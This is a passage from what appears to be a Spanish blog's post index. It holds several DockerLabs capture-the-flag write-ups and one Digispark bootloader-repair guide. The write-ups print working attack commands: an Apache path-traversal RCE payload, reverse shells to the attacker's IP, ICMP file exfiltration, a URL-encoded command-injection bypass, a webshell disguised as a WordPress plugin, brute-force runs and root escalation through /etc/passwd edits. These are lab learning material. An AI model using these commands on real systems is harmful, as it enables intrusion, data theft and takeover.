puesto que algunas son por hacer malas configuraciones , pero la que nos interesa es la de CVE-2021-41773 que nos permite ejecutar comandos en el servidor. Quien lo pete con otro cve estare encantado de leer su writeup y seguir aprendiendo.Esta maquina permite la RCE pero yo no consegui cargar ningun fichero como /etc/passwd con path traversal que seria lo logico y podria ser debido a haber desactivado MPMs e indirectamente salta error de servidor.Buscando exploits por github encontre el payload correcto para ejecutar comandos. Para ello use el siguiente payload.curl http://172.17.0.2/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh -d 'echo Content-Type: text/plain; echo; whoami'InfiltracionManualmenteLo interesante de hacerlo de forma manual siguinedo las pistas que nos propone este reto es que aprenderemos a usar ping de una manera diferente a la habitual.Ahora a mandarnos una revshell y ver que tenemos en el servidor.curl http://172.17.0.2/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh -d $'echo Content-Type: text/plain\\n\\nbash -c \"bash -i &gt;&amp; /dev/tcp/192.168.0.104/1188 0&gt;&amp;1\"'nc -lvnp 1188Una vez dentro ejecutamos los comandos mas tipicos buscando algo que nos hallan dejado , no hay sudo ni suid ni procesos.Pero me encuentro con unos ficheros curiosos el mp3 que suena a ruido la letra de la cancion y un fichero de texto oculto.Por todo lo encontrado hasta ahora y por lo que nos dice .stego vamos a tener que descargarnos el fichero de miletra.txt.Aqui viene lo interesante y es que como no disponemos de ninguna forma de levantar un servicio para tranferir el fichero vamos a usar ping para transferir el fichero. Agradecer a Ben1B3astt por sus videos tambien recomendables.  Hemos de tener unas cosas claras que son , ping espera datos en hexadecimal , el tamaño maximo que ping puede enviar por trama icmp , el tamaño en el que partimos el fichero y los bytes que enviamos en cada trama para luego poder extraerlos y reconstruir el fichero.En la victima :cat miletra.txt | xxd -p -c 4 | read line; do ping -c 1 192.168.0.109 -p $line; doneY en el atacante nos ponemos a capturar con tcpdump o tshark creo que cualquiera de los dos lo hace bien(obvio primero lanzad tcpdump).sudo tcpdump -i docker0 icmp -n -v -w Captura.pcapSi nos fijammos veremos que ping a añadido el patern que es nuestro fichero y en tcpdump nos hemos de fijar que no se halla perdido ningun paquete si no la recuperacion del fichero no funcionara correctamente.Ahora nos toca extraer el fichero de la captura y para ello usaremos scapy.(para la gente que esta aprtendieno la ia les sera de utilidad).Yo con su ayuda cree este script python que me permite recuperar las partes interesantes#!/usr/bin/python3import sysimport signalimport loggingfrom scapy.all import *logging.basicConfig(level=logging.DEBUG, format='\\n[*]success: %(message)s')file_printed = False  # Variable global para controlar la impresión# Abrir el archivo de salida en modo de escrituraoutput_file = \"resultado.txt\"def ctrl_c(param1, param2):    logging.info(f\"[!] Script Finalizado\")    sys.exit(3)# Definir el manejador de SIGINTsignal.signal(signal.SIGINT, ctrl_c)def parser_data(packet):    global file_printed  # Usar la variable global    if packet.haslayer(ICMP):        if packet[ICMP].type == 8:  # Echo Request            try:                # Depuración: Ver el contenido del paquete ICMP                logging.debug(f\"Paquete ICMP encontrado: {packet.summary()}\")                                # Imprimir carga útil para verificar su contenido                payload = packet[ICMP].load                logging.debug(f\"Carga útil del paquete: {payload}\")                # Obtener solo el último byte del payload                last_byte = payload[-4:] if len(payload) &gt; 0 else b''                # Eliminamos el filtro por secuencia y procesamos todos los paquetes Echo Request                if not file_printed:                    logging.info(\"[+] Archivos extraídos: \")                    file_printed = True                                if last_byte:                    # Decodificar los fragmentos de bytes y unirlos                    decoded_string = last_byte.decode('utf-8', errors='ignore')  # Decodificar en UTF-8, ignorando errores                    logging.info(f\"[+] Último byte de carga útil (decodificado): {decoded_string}\")                    print(f\"[+] Último byte de carga útil (decodificado): {decoded_string}\")                                        # Guardar en el archivo de texto                    with open(output_file, \"a\") as f:                        f.write(f\"{decoded_string}\")  # Escribir el texto decodificado                                    else:                    logging.warning(\"[!] Paquete ICMP sin carga útil.\")                        except Exception as e:                logging.error(f\"[!] Error al procesar el paquete ICMP: {e}\")def sniffer_packets(pcap_file):    try:        logging.info(f\"[*] Cargando archivo pcap: {pcap_file}\")        packets = rdpcap(pcap_file)  # Cargar el archivo pcap        # Verificar si se cargaron paquetes        if len(packets) == 0:            logging.warning(\"[!] El archivo pcap no contiene paquetes.\")        else:            logging.info(f\"[*] Total de paquetes cargados: {len(packets)}\")        # Filtrar los paquetes y procesarlos        for packet in packets:            parser_data(packet)    except Exception as e:        logging.error(f\"[!] Error al cargar el archivo pcap: {e}\")if __name__ == '__main__':    pcap_file = \"Captura.pcap\"  # Reemplaza esto con la ruta de tu archivo pcap    sniffer_packets(pcap_file)python3 extract_data4.pyComo veis por el numero del script a mi costo un poco ajustarlo al escenario , este script te crea el fichero resultado.txt con el contenido del fichero que hemos transferido. En este caso la letra de la cancion.Ya con el fichero en nuestra maquina y por la pista que encontramos en .stego sabemos que esconde algo con el metodo usado por snow WebSnow.Para hallar la password que nos permitira ver que esconde me creo un scripts de bash pra aplicarle fuerza bruta.#!/bin/bash# Definir archivo y lista de contraseñasFILE=\"miletra.txt\"WORDLIST=\"rockyou.txt\"# Iterar sobre cada contraseña en el diccionariowhile read -r pass; do    # Ejecutar el comando snow con la contraseña modificar a vuestra ruta de instalcion    OUTPUT=$(./snow -Q -C -p \"$pass\" \"$FILE\" 2&gt;/dev/null)    # Verificar si la salida no está vacía y contiene \"password:\"    if [[ ! -z \"$OUTPUT\" &amp;&amp; \"$OUTPUT\" == *\"password:\"* ]]; then        # Si contiene la palabra \"password:\", entonces mostrar la contraseña y el mensaje        echo \"[+] Contraseña encontrada: $pass\"        echo \"Mensaje oculto: $OUTPUT\"        break    fidone &lt; \"$WORDLIST\"# Si no se encuentra la contraseña, imprimir un mensaje de errorif [[ -z \"$OUTPUT\" || \"$OUTPUT\" != *\"password:\"* ]]; then    echo \"[-] No se encontró la contraseña en el diccionario.\"fiUn script sencillo que nos permite probar todas las contraseñas de un diccionario y ver si alguna de ellas es la correcta.Ya tenmos la password  y podemos acceder con el usuario punkysu punkyAutomaticoLa verdad esta no me la esperaba y no la vi venir , pero con el uso de la terminal meterpreter lo que acabamos de realizar es mucho mas sencillo por no decir que con lo que me costo realizar el metodo anterior se convierte esto en un juego de niños.Me paso como a Mario no recuerdo que maquina fue pero tambien estaba complicada hacerla manualmente y con msfconsole se peto en dos minutos.msfconsolesearch CVE-2021-41773use exploit/multi/http/apache_normalize_path_rceRealizamos las configuaraciones necesarias y lanzamos el exploit.run Una vez en meterpreter solo debemos hacer uso del puto comando interno download para descargar lo que me llevo unas horitas con ping.De esta forma solo hacemos fuerza bruta contra el fichero y listo.Ahora sigamos con punkyTrepando a rootDentro de punky usamos primero los comandos tipicos para ver que tenemos y que podemos hacer.find / -perm -u=s -type f 2&gt;/dev/nullNos encuentra un binario task_manger primero vemos lo que hace y posteriormente analizamos el binario.Despues de realizar alguna acciones a traves del binario que tiene suid activado y pese a inyectar comandos a traves de el no se consigue nada pues cuando hacemos un nos lo muestra como el usuario que lo ejecuta no conpribvilegios elevados.strings task_managerSi observamos las cadenas que nos muestra el binario hallamos lo que parece ser una lista de contraseñas  , lo cual nos incita a realizar un ataque de furza bruta en local.Para ello usaremos el script de Mario que encontrareis en su github y que es muy util para este tipo de cosas.Tambien nos creamos el diccionario con las claves que esconde el binario.Suerte que nos dejaron nano.cd /home/punkynano dict.txtnano brute.shsh brute.sh root dict.txtNos encuentra la pass sin problema.Gracias por leer y cualquier duda o consejo ya saben contacten en X."
  },
  
  {
    "title": "Balufood, DockerLabs",
    "url": "/posts/balufood/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, nmap, hydra, feroxbuster",
    "date": "2025-05-02 00:00:00 -0300",
    





    
    "snippet": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              Escano de directorios      feroxbuster  ...",
    "content": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              Escano de directorios      feroxbuster              Brute force login http      Hydra              escalada de privilegio      informacion expuesta      Reconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX balufood 172.18.0.2reporteComo vemos en el reporte en esta ocasion tenemos varios puertos abiertos el el 22 ssh, el 5000 en el 5000 tenemos un servicio python corriendo una web asi que mientras la revisamos manualmente vamos a lanzar feroxbuster para ver que encuentramos.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x py -u http://172.17.0.2:5000En el reporte de feroxbuster vemos que tenemos unos directorios o endpoints que en este caso seria mas correcto llamarlo asi con nombre como carta , admin , login, cosa que ya habiamos visto navegando por la web ,lo curioso es que al realizar el pedido en la esquina derecha de la web nos aparece un acceso a admin el cual nos lleva al login.Pruebo con las credenciales por defecto y no obtengo suerte tampoco con algun error en sql injection, por lo que decido probar suerte con hydra asumiendo que siempre me devuelve Credenciales invalidas y que el user es admin.hydra -l admin -P ~/Descargas/rockyou.txt/rockyou.txt 172.17.0.2 -s 5000  http-post-form \"/login:username=^USER^&amp;password=^PASS^:Credenciales inválidas\"Manualmente probe pass123 , 123456 y 5 o 6 mas de ese tipo menos admin admin lpm.Una vez obtenemos las credenciales, accedemos a la web y vemos que tenemos un panel de administracion donde podemos ver los pedidos.Poco podemos hacer desde ese panel asi que revisamos el fuente.En un comentario del html obtenemos user y pass , a probar en ssh.Estamos dentro y seguimos la rutina sudo,find,ps,env,etc…, solo averiguo que existe el user balulero.Revisando los ficheros de sysadmin, encuentro algo en app.py que podria ser un pass asi que lo pruebo.su baluleroEstamos como balulero utilizando la secret_key ahora a por root.Ya en el home de balulero ejecuto lo de costumbre como antes y no obtebngo nada hasta que reviso el history que se debe haber olvidado de borrar o nos lo ha dejado de guia.Vemos que se edita .bashrc asi que lo revisamos y encontramos un alias muy jodio.solo nos queda conectarnos con su , asi que ejecutamos su y el password obtenido del aliasMuchas gracias por llegar aqui ,….. saludos :-)."
  },
  
  {
    "title": "Chocoping, Dockerlabs",
    "url": "/posts/chocoping/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, fuzzing, nmap, ffuf, john, searchbins, urlencode, revshell",
    "date": "2025-04-11 00:00:00 -0300",
    





    
    "snippet": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing de archivos y carpetas      fero...",
    "content": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing de archivos y carpetas      feroxbuster              fuzzing de parametro      ffuf              reverse shell      urlencodeada              escalada de privilegios      man              cracking zip password      zip2john      Reconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX chocoping 172.17.0.2reporteComo vemos en el reporte en esta ocasion solo tenemos varios puertos abierto el 80 http el resultado d nmap tambien nos revela un fichero  en el enlace al reporte de nmap puedn verlo.Lo comprobamos lanzando un fuzzing de ficheros y directorios por si esconde algo mas.Yo no encuentro nada mas asi que avanzamos a traves de ese fichero.El fichero ping.php parece que espere un ip por lo que dice pero primero deberiamos hallar el parametro para la ejecucion del propio ping , si hallamos el parametro y conseguimos hacer ping lo siguiente deberia ser tratar de concatenar algun otro comando.Primero lo primero hallar el parametro. Vamos a usar ffuf para ello.ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2/ping.php\\?FUZZ\\=google.es -fl 1  Para esconder los falsos positivos tenemos varias opciones de filtrado con fuff : -fl 1 esconde las lineas que solo tengan una linea y -fs 34 escondemos las del tamaño especificado.Como vemos el parametro es ip y como valor use google.es. Ahora vamos a ver si podemos hacer un ping desde la web.Lo hacemos y nos muestra el resultado , despùes de estar un buen rato probando a mano y tratando de bypasear el filtro qu es evidente por la respuesta de comando no permitido y por como depende de lo que ejecutes se queda la web en blanco y sin errores.Apunto de volverme loco llego hasta la web de hackviser.com donde encuentro la solucion , la cual es escapar los comandos con backslashes contrabarras para mi.  que esta haciendo el filtro de esta web lo primero que es extraño es que permite usar tanto ; y | pero no &amp;&amp; no obstante con los dos primeros concatenamos comandos sin problema, por otro lado el unico filtro que aplica es sobre los comandos que escribimos en la web , es decir , comprueba la entrada del usuario y si coincide con un comando conocido te lo bloquea pero al hacer uso del backslash se lo traga pq no lo ve como un comando sino como un string , recordamos que \\ escapa el siguiente caracter pero si el caracter que le sigue no es un caracter especial se ignora.Esto me lleva a pensar que el filtro no es un regex sino una simple comparacion de cadenas las cuales no se comprueban antes de ser enviadas internatemente por ping.phpCorrecion despues de ver el contenido de ping.php , hay  una funcion dentro del fichero que solo permite la ejecuion si lleva \\Ahora creo que ya estamos en disposicion de tratar de encontrar la forma de encodear la revshell.curl \"http://172.17.0.2/ping.php?ip=127.0.0.1%3Bi%64%3Bb\\ash%20\\-c%20'exec%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F192.168.0.101%2F1188%20%3C%261'\"Como veis tenemos que url-encodear todo menos el filtro explicito que se especifica dentro de ping.php es decir la contra barra es lo unico que no codifico y asi me funciona.IntrusionComo podemos ver ya entramos a la maquina ahora como siempre comandos habituales sudo findNos han dejado el binario man con sudo para escalar pero antes realizamos el tratamiento de la tty  si no no funciona la paginacion y pro tanto no poodremos realizar la escalada.Una vez realizado el movimiento lateral entre ususarios , en el directorio local nos ha dejado un zip lo descargamos a nuestra maquina y se lo pasamos a zip2john para hashear la contraseña y crackearla con john.php -S 0.0.0.0:8000zip2john secretito.zip &gt; hashedjohn --format=PKZIP -w ~/Descargas/rockyou.txt/rockyou.txt hashedstrings traffic.pcapLa contraseña de root esta escondida en el pcap del zip , asi que.su Estamos como rootMuchas gracias por leer , dudas sugerencias y comentarios por X."
  },
  
  {
    "title": "Recuperar el digispark attiny85",
    "url": "/posts/bricked-digispark85/",
    "categories": "Hardware",
    "tags": "digispark, attiny85, micronucleus",
    "date": "2025-04-06 00:00:00 -0300",
    





    
    "snippet": "Hardware necesarioEn mi caso y con lo que tengo en casa he usado un arduino nano como programador isp , el digispark attiny85 brickeado ,unos cables dupont y un condensador electrolitico de 10uf y ...",
    "content": "Hardware necesarioEn mi caso y con lo que tengo en casa he usado un arduino nano como programador isp , el digispark attiny85 brickeado ,unos cables dupont y un condensador electrolitico de 10uf y 50v.Version actual de micronucleus.SituacionDespues de estar trasteando y jugando un buen rato y cargando distintos sketchs a traves del arduino ide se ha corrompido el bootloader y el pc no es capaz de reconocer el digispark.Esto tiene solucion no hay que alarmarse ,aqui les explico cuales fueron las herramientas empleadas para grabar de nuevo el bootloader micronucleus.En teoria se deberia poder instalar desde el propio arduino ide cosa que yo no consegui ni modificando el archivo boards.txt ni programmers.txt ni nada por el estilo.(en esos ficheros se deben añadir los datos del programador que usa el digispark para grabar el bootloader , se encuentran dentro de la carpeta de instalacion de digistump).Lo que hice fue descargar el firmware de micronucleus y grabarlo a traves de un arduino nano como programador isp, vamos como lo hariamos normalmente pero de forma manual si el arduino-ide.No viene mal que se haya brickeado porque de paso aprovechamos y le ponemos la ultima version del bootloader.Pasos a seguir1.Lo primero sera descargar todo lo necesario , herramientas de compilacion y el firmware de micronucleus.sudo pacman -S avrdude arm-none-eabi-gccCon avrdude y arm-none-eabi-gcc tendremos lo necesario para grabar el firmware micronucleus.Despues como necesitamos el .hex y queremos la ultima version instalamos tambien las herramientas necesarias para compilarnos el ultimo firm.sudo pacman -S avr-libc avr-gcc  Es probable que ustedes no tengan instaladas algunas otras herramientas de compilacion , asi que instalen tambien las dependencias que les sugiera su gestor de paquetes.2.Con todo instalado lo siguiente es descragarnos el firmware de micronucleus.git clone https://github.com/micronucleus/micronucleus.git3.Una vez descargado el firmware de micronucleus nos vamos a la carpeta micronucleus y dentro de ella a la carpeta firmware y ejecutamos make para compilar , esto nos generara el .hex que necesitamos subir a nuestro digispark.Mas concretamente genera un main.hexcd ~/micronucleus/firmwaremake4.Con todo lo necesario instalado y el firmware compilado ahora solo nos queda conectar el digispark al arduino nano el cual hemos de configurar como programador isp.Abrimos arduino ide y en la seccion de ejemplos buscamos el ejemplo de ArduinoISP y lo subimos al arduino nano.Para ello conectamos el arduino nano al pc y seleccionamos la placa arduino nano y el puerto correspondiente y upload.Ahora nos queda conectar el digispark al arduino nano de la siguiente manera:            Arduino Nano      Digispark                  GND      GND              VCC      5V              D10      pin 5  reset              D11      pin 0  MOSI              D12      pin 1  MISO              D13      pin 2  SCK        No olvidemos conectar el condensador entre los pines libres de arduino nano reset y gnd.Este se encarga de evitar el reinicio de arduino en la subida del bootloaderSiento la calidad de la imagen y no tener cables de distinto color para que lo puedan identificar mejor.5.Una vez compilado el firmware y ubicados en la carpeta donde se creo el main.hex y ejecutamos el siguiente comando para grabar el bootloader al digispark.avrdude -c arduino -p t85 -P /dev/ttyUSB0 -b 19200 -U flash:w:main.hex:i\\n  Recuerda cambiar el puerto por el que corresponda a tu sistema operativo.6.Una vez grabado el bootloader desconectamos el digispark y lo volvemos a conectar al pc y ya deberia de funcionar correctamente y subir skecths directamente desde arduino ide.ConclusionesSi no tienes un arduino nano puedes usar cualquier otro arduino como programador isp , incluso un digispark que no este brickeado.Si no tienes un arduino puedes usar un programador usbasp o similar.Muchas gracias por leer y no olvides seguirme en mis redes sociales y compartir el post si te ha gustado.Si tienes alguna duda o sugerencia no dudes en dejar un comentario en X y te responderé lo antes posible.Cuando lo vuelva a brickear cosa que parece comun tratare de grabar el proceso asi queda mas claro."
  },
  
  {
    "title": "Walking-Dead, DockerLabs",
    "url": "/posts/walkingdead/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, fuzzing, nmap, ffuf, python, searchbins, urlencode, revshell",
    "date": "2025-03-22 00:00:00 -0300",
    





    
    "snippet": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing de parametro      ffuf          ...",
    "content": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing de parametro      ffuf              reverse shell      urlencodeada              escalada de privilegios      python              escalada de privilegios      searchbins      Reconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX walkingdead 172.18.0.2reporteComo vemos en el reporte en esta ocasion tenemos varios puertos abiertos el el 22 ssh, el 80 httpVamos a empezar revisando la web manualmente y vemos una pagina sin ninuguan dat pero si revisamos el codigo encontramos un link que nos lleva a un LFI o RCE pareciera , tendremos que buscar el parametroc para ello FUFFProbando a incluir archivos locales no encontraba nada pero pasnadole un whoami he tenido exito.ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2/hidden/.shell.php\\?FUZZ\\=whoami -fs 0 ```            parametro      utilidad                  -c      damos color a la salida              -w      indicamos el diccionario              -u      la url              -fs      filtra las respuestas que tienen una longitud de 0 bytes      Obtenemos el parametro cmdAhora que tenemos el parametro vamos a probar a ver si podemos ejecutar comandos.Llagados a este punto ejecuto un cat /etc/passwd y vemos que hay dos usuarios rick y negan , esto nos abre dos puertas una o fuerza bruta contra ssh y una revshellAl tratarse de una maquina calificada como facil vamos a lo rapido primero asi que mandamos una revshell y hacemos las comprobaciones de suid , sudo y demas.Primero a la escuha con ncy luego nos lanzamos la revshell urlencodeada de otra forma no me funciono.en mi maquina local lanzo un netcat para recibir la conexion.nc -lnvp 1188y en la victimabash -c \"bash -i &gt;%26 %2Fdev%2Ftcp%2F172.17.0.1%2F1188 0&gt;%261\"Nos toca realizar el tratamiento de la tty para ello lanzamos los siguientes comandos script /dev/null -c bash    control Z con esto la pasamos a segundo plano  stty raw -echo ; fg  reset    en otra terminal lanzamos stty size para saber el numero de filas y columnas de nuestra terminal  export TERM=xterm  export SHELL=bash  stty rows 32 columns 149Con esos pasos nuestra term deberia ser funcional.Vemos que nos han dejado a python3.8 y que podemos escalar con el avriguemos como hacerlo porque de la forma habitual no me permitio cosa que en otras maquinas si, no acabo de entender  porque.Este primer comando me devuelve a www-data/usr/bin/python3.8 -c \"import os; os.system('/bin/bash')\" Lo mismo me sucede si abro la terminal de python y lanzo el comandoimport pty;pty.spawn(\"/bin/bash\");Ni caso a los dos comandos de arriba estaba trabajando como si estuviese activada la ejecucion con sudo y no con setuid, estoy espeso.Cualquiera de estos dos comando me  funciona para escalar a root ademas searchbins me lo deja claro./usr/bin/python3.8 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'Somos rootMuchas gracias a difundir y compartir lo que sabemos."
  },
  
  {
    "title": "Bad Plugin - DockerLabs",
    "url": "/posts/badplugin/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, fuzzing, nmap, feroxbuster, hydra, gawk",
    "date": "2025-03-17 00:00:00 -0300",
    





    
    "snippet": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing de directorios      feroxbuster ...",
    "content": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing de directorios      feroxbuster              descubrimiento de tecnologias      whatweb y wapalyzer              fuerza bruta login wordpress      hydra              gawk      Manejando ficheros desde gawk      Reconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX badplugin 172.18.0.2reporteComo vemos en el reporte en esta ocasion tenemos solo el 80 httpVamos a empezar revisando la web manualmente aparentemente no hay nada aprte del error que nos muestra al presionar y en el codigo tampoco , asi que lanzamos feroxbuster.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -u http://192.168.1.100Obtenemos los directorios wordpress , javascript , phpmyadminEs curioso que cada uno actua de manera distinta en wordpress no lo encuentra pero en la barra de busqueda me tira un dominio escolares.dl , en java me tira forbidden y phpmyadmin el login. Asi que empezaremos añadiendo escolares.dl a /etc/hostsAhora que tenemos acceso al dominio vamos a  tratar de averiguar con whatwebAl parecer es un wordpress lo corroboramos accediendo a wp-admin.Si introducimos de user admin y cualquier pass vemos que nos indica que hay un usuario admin por tanto vamos a hacer fuerza bruta contra admin con la herramienta hydra , podemos obtener el formato del post desde la consola de desarollador en cualquier navegador y contruimos la url de ataque.hydra -l admin -P Descargas/rockyou.txt/rockyou.txt  escolares.dl http-post-form \"/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Acceder&amp;redirect_to=http%3A%2F%2Fescolares.dl%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:Error\"            parametro      que hace      ejemplo                  -l      indicamos el usuario (L para lista de usuarios)                     -P      indicamos el diccionario      rockyou              http-post-form      le indicamos el tipo de peticion a realizar             Importante confirmar tambien el mensaje de error que nos devuelve la web para saber que estamos haciendo bien la fuerza brutaObtenemos el password.Una vez dentro del panel y dado que estamos como administrador podriamos hacer desde instalar un pluggin malicioso hasta subir un archivo php que nos de acceso a la maquina en esta version comprueba bastante bien que estmaos subiendo asi que  en este caso , vamos a subir un archivo php que nos de acceso a la maquina a traves de un webshell y a subirlo por el administrador de pluggins , dado que es lo unico que he encontrado disponible.Para ello primero he buscado como son las cabeceras de un plugin de wordpress y he creado un archivo php con el siguiente contenido y en el mismo directorio he puesto una webshell y lo he zipeado para subirlo.&lt;?php/** * Plugin Name: No License File * Plugin URI: https://example.com/no-license-file * Description: Este plugin impide el acceso directo al archivo license.txt en WordPress. * Version: 1.0.0 * Author: Tu Nombre * Author URI: https://example.com * License: GPL2 * Text Domain: no-license-file */?&gt;Worpress extrae datos  del fichero php que aparenta ser un plugin , a lo mejor solo la webshell zipeada tambien funcionaria pero no lo he probado.Para subirlo como un plugin cualquiera vamos a Apariencia -&gt; Editor y seleccionamos el archivo zip que hemos creado.Una vez subido vamos a ruta donde se instalo para ver la webshell y el otro php que no hace nada de hecho ni active el plugin.Ahora nos mandamos una reverse shell y empezamos la intrusionIntrusionOjo pq en esta maquina docker nos entrega un ip del tipo 192.168.x.x y si nos lanzamos una rev como de costumbre nunca llegara a nosotros , por tanto debemos lanzar una rev que se quede en escucha en la maquina docker y no en la nuestra.Nos ponemos a la escucha.nc -lvnp 1188Y lanzamos la rev desde la webshell apuntando al interfaz puente de docker.bash -c 'exec bash -i &amp;&gt;/dev/tcp/192.168.1.1/1188 &lt;&amp;1'Estamos dentro y nos encontramos al binario gawk con el bit setuid activado.find / -perm -u=s -type f 2&gt;/dev/nullVamos a buscar en searchbins si hay alguna vulnerabilidad conocida para gawk nos da ideas pero lo que he probado me devuelve siempre al user www-data.sudo /usr/bin/gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN { s = \"/inet/tcp/0/\" RHOST \"/\" RPORT; while (1) {printf \"&gt; \" |&amp; s; if ((s |&amp; getline c) &lt;= 0) break; while (c &amp;&amp; (c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c)}}'&lt;c &amp;&amp; (c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c)}}'Con el siguiente comando he consiguido eliminar la x de root pero no almacanarlo debemos redirigir la salida a traves del propio gawk./usr/bin/gawk '{sub(/x/, \"\"); print}' /etc/passwd/usr/bin/gawk -i inplace '{sub(/x/, \"\"); print}' /etc/passwdCon este ultimo comando hemos conseguido borrar la x directamente desde gawk y solo nos queda hacer su  root y ya tendriamos la maquina hecha.Muchas gracias por leer , a compartir y a practicar hacking etico."
  },
  
  {
    "title": "Apiroot, DockerLabs",
    "url": "/posts/apiroot/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, fuzzing, nmap, ffuf, hydra, python, curl",
    "date": "2025-03-16 00:00:00 -0300",
    





    
    "snippet": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing de directorios      feroxbuster ...",
    "content": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Tecnicas      Herramientas                  scan de puertos      nmap              fuzzing de directorios      feroxbuster              fuzzing de parametro o password      ffuf              fuerza bruta ssh      hydra              escalada python      - que basico              escalada curl      searchbins      Reconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX apiroot 172.18.0.2reporteComo vemos en el reporte en esta ocasion tenemos varios puertos abiertos el el 22 ssh, el 5000 con un server pythonVamos a empezar revisando la web manualmente ya vemos que al menos hay un directorio llamado api y algun otro mas asi que feroxbuster.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -u http://172.17.0.2:5000/apiObtenemos el directorio usersAhora que tenemos el directorio desconocido seguimos leyendo la web y nos muestra la forma es la que hariamos la peticion pero nos falta un dato el bearer token para ello lanza ffuf con el rockyou pq no creo que sea el tipico bearer Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c lo cual seria de locos intertarlo por fuerza bruta.ffuf -c -w ~/Descargas/rockyou.txt/rockyou.txt -H \"Authorization: Bearer FUZZ\" -u \"http://172.17.0.2:5000/api/users\" -fc 401 -fl 31            parametro      que hace      ejemplo                  -c      damos color a la salida                     -w      indicamos el diccionario      rockyou              -H      Encabezado o headers      en este caso “Authorization: Bearer FUZZ”              -u      la url                     -fc 401      que no muestre las respuestas no autorizadas                     -fl 31      filtra las respuestas que tienen una longitud de 31 bytes             Obtenemos el passwordAhora ya con el directorio y la bearer podemos empezar la peticiones a ver que sacamos.Probe a crear usuarios pero siempre inidcaba que faltan datos .Pero bueno ya tenemos usuario para probar contra ssh voy a tirar de bob primero con hydra.hydra -l bob -P ~/Descargas/rockyou.txt/rockyou.txt 172.17.0.2 ssh -t 12A ver que encontramos….SSHComo vemos en la imagen nos ha dejado python3 a disposicion.Yo ejecuto lo siguiente.sudo -u balulero /usr/bin/python3import pty;pty.spawn(\"/bin/bash\");Lo cual me da una shell con el user nuevo.Ya sabemos lo que hemos de hacer podemos escribir cualquier archivo que sepamos que existe lo mas sencillo es quitarle la x a root del fichero passwd.Yo en este caso he probado de crear un usario nuevo privilegiado con root.Me he pasado el passwd a la maquina atacante y he añadido:firstatack::0:0:firstatack:/home/balulero:/bin/bashPosteriormente he preparado las variable para la escalada con curl.URL=http://192.168.0.102:8000/passwdLFILE=/etc/passwdEn mi maquina atacante levanto un servidor con python y en la victima ejecuto curl.python3 -m http.server 8000sudo curl $URL -o $LFILEUna vez cambiado el fichero solo ejecuto.su firstatackHAsta aqui la maquina , divertida porque es muy intuitiva.Gracias por leer."
  },
  
  {
    "title": "Gitea, DockerLabs",
    "url": "/posts/gitea/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, path traversal, hydra, udf mysql",
    "date": "2025-03-14 00:00:00 -0300",
    





    
    "snippet": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Autor      Tecnicas      Herramientas                  Dise0                                   scan de puertos      nmap   ...",
